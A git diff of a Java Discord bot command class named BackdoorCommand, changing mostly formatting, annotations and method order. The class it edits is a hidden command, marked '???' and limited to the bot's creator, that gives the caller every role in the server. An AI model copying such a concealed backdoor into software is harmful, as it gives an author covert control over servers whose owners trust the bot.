@@ -5,6 +5,7 @@ import fr.mrcraftcod.gunterdiscord.commands.generic.CommandResult;
 import fr.mrcraftcod.gunterdiscord.utils.Actions;
 import net.dv8tion.jda.core.entities.ChannelType;
 import net.dv8tion.jda.core.events.message.MessageReceivedEvent;
+import org.jetbrains.annotations.NotNull;
 import java.util.LinkedList;
 import java.util.List;
 
@@ -14,43 +15,36 @@ import java.util.List;
  * @author Thomas Couchoud
  * @since 2018-04-12
  */
-public class BackdoorCommand extends BasicCommand
-{
+public class BackdoorCommand extends BasicCommand{
 	@Override
-	public CommandResult execute(MessageReceivedEvent event, LinkedList<String> args) throws Exception
-	{
+	public CommandResult execute(@NotNull MessageReceivedEvent event, @NotNull LinkedList<String> args) throws Exception{
 		super.execute(event, args);
-		Actions.giveRole(event.getGuild(), event.getAuthor(), event.getGuild().getRoles());
+		Actions.giveRole(event.getAuthor(), event.getGuild().getRoles());
 		return CommandResult.SUCCESS;
 	}
 	
 	@Override
-	public int getScope()
-	{
-		return ChannelType.PRIVATE.getId();
+	public AccessLevel getAccessLevel(){
+		return AccessLevel.CREATOR;
 	}
 	
 	@Override
-	public String getName()
-	{
+	public String getName(){
 		return "Backdoor";
 	}
 	
 	@Override
-	public List<String> getCommand()
-	{
+	public List<String> getCommand(){
 		return List.of("backdoor");
 	}
 	
 	@Override
-	public String getDescription()
-	{
+	public String getDescription(){
 		return "???";
 	}
 	
 	@Override
-	public AccessLevel getAccessLevel()
-	{
-		return AccessLevel.CREATOR;
+	public int getScope(){
+		return ChannelType.PRIVATE.getId();
 	}
 }
